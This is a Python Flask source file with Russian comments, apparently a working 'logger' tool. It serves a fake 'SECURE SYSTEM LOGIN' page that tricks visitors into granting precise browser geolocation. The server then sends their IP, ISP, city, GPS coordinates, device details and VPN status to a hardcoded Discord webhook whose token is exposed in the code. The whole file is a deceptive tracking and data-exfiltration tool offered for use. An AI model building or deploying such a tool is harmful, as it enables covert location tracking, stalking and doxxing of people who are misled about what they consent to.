import requests
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)

# Твой вебхук
WEBHOOK_URL = 'https://discord.com/api/webhooks/1493228365556220066/9vBgJmLlOupwVlDe52TW4mNs4KvGEqYeZ3E0UxVnGDSuyTDJ7L0pLYMpSClDzQxj3k3h'

# HTML + JavaScript для запроса точной геопозиции
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SECURE SYSTEM LOGIN</title>
    <style>
        body { background: #0a0a0a; color: #00ff00; font-family: 'Consolas', monospace; 
               display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #00ff00; padding: 40px; background: #000; box-shadow: 0 0 20px #00ff0044; text-align: center; max-width: 400px; width: 100%; }
        h1 { font-size: 1.5rem; text-shadow: 0 0 10px #00ff00; margin-bottom: 30px; }
        button { background: #002200; color: #00ff00; border: 2px solid #00ff00; padding: 15px 30px; 
                 cursor: pointer; font-family: inherit; font-weight: bold; font-size: 16px; transition: 0.3s; width: 100%; }
        button:hover { background: #00ff00; color: #000; box-shadow: 0 0 15px #00ff00; }
        #status { margin-top: 20px; font-size: 0.9rem; color: #aaaaaa; min-height: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <h1>[ REQUIRED AUTHORIZATION ]</h1>
        <button id="authBtn" onclick="requestData()">ПОДТВЕРДИТЬ ДОСТУП</button>
        <div id="status">Ожидание действий пользователя...</div>
    </div>

    <script>
        function requestData() {
            const status = document.getElementById('status');
            const btn = document.getElementById('authBtn');
            btn.disabled = true;
            status.style.color = "#00ff00";
            status.innerText = "Запрос разрешений браузера...";

            // Спрашиваем точную геопозицию у пользователя
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        // Если разрешил
                        sendData(position.coords.latitude, position.coords.longitude, "Точная (GPS/Браузер)");
                    },
                    (error) => {
                        // Если запретил или ошибка
                        sendData(null, null, "Отклонено (Только IP)");
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else {
                sendData(null, null, "Не поддерживается (Только IP)");
            }
        }

        function sendData(lat, lon, geoType) {
            const status = document.getElementById('status');
            status.innerText = "Шифрование и отправка пакета...";

            // Отправляем данные на наш Python сервер
            fetch('/send', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ exact_lat: lat, exact_lon: lon, geo_type: geoType })
            }).then(res => res.json()).then(data => {
                if (data.success) {
                    document.body.innerHTML = `<div class='box'><h1>ACCESS GRANTED</h1><p>Данные успешно переданы на сервер.</p></div>`;
                } else {
                    status.style.color = "#ff0000";
                    status.innerText = "Ошибка передачи данных.";
                }
            }).catch(err => {
                status.style.color = "#ff0000";
                status.innerText = "Ошибка соединения с сервером!";
            });
        }
    </script>
</body>
</html>
"""


@app.route('/')
def index():
    return render_template_string(HTML_PAGE)


@app.route('/send', methods=['POST'])
def send_to_discord():
    # Получаем данные от JS (точные координаты, если юзер разрешил)
    client_data = request.json or {}
    exact_lat = client_data.get('exact_lat')
    exact_lon = client_data.get('exact_lon')
    geo_type = client_data.get('geo_type', 'Неизвестно')

    # Получаем IP адрес
    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    # ФИКС 127.0.0.1: Если тестируем дома, узнаем реальный IP через api.ipify.org
    if ip == '127.0.0.1':
        try:
            ip = requests.get('https://api.ipify.org', timeout=3).text
        except:
            pass

    # Получаем данные по IP
    geo = {}
    try:
        r = requests.get(
            f'http://ip-api.com/json/{ip}?fields=status,country,city,zip,lat,lon,timezone,isp,mobile,proxy')
        if r.status_code == 200:
            geo = r.json()
    except Exception as e:
        print(f"IP-API Error: {e}")

    # Определяем, какие координаты показывать (точные или по IP)
    final_lat = exact_lat if exact_lat else geo.get('lat', 'N/A')
    final_lon = exact_lon if exact_lon else geo.get('lon', 'N/A')

    map_link = f"[Открыть Google Maps](https://www.google.com/maps?q={final_lat},{final_lon})" if final_lat != 'N/A' else "Нет данных"

    # Данные браузера
    ua = request.user_agent

    # Собираем красивую карточку
    embed = {
        "title": "⚡ ДОСТУП ПОДТВЕРЖДЕН",
        "color": 65280,  # Зеленый
        "fields": [
            {"name": "🖥️ IP Адрес", "value": f"`{ip}`", "inline": True},
            {"name": "🌍 Локация (IP)", "value": f"{geo.get('country', 'N/A')}, {geo.get('city', 'N/A')}",
             "inline": True},
            {"name": "🏢 Провайдер", "value": f"`{geo.get('isp', 'N/A')}`", "inline": False},

            # Инфа о точности
            {"name": "📍 Тип Геолокации", "value": f"`{geo_type}`", "inline": True},
            {"name": "🗺️ Координаты", "value": f"`{final_lat}, {final_lon}`\n{map_link}", "inline": True},

            {"name": "📱 Устройство", "value": f"**ОС:** `{ua.platform}`\n**Браузер:** `{ua.browser}`", "inline": False},
            {"name": "⚠️ Сеть",
             "value": f"Мобильная: `{'Да' if geo.get('mobile') else 'Нет'}` | Proxy/VPN: `{'Да' if geo.get('proxy') else 'Нет'}`",
             "inline": False}
        ],
        "footer": {"text": "Advanced Logger System"}
    }

    requests.post(WEBHOOK_URL, json={"embeds": [embed]})

    return jsonify({"success": True})


if __name__ == '__main__':
    # Запускаем сервер
    app.run(host='0.0.0.0', port=5000)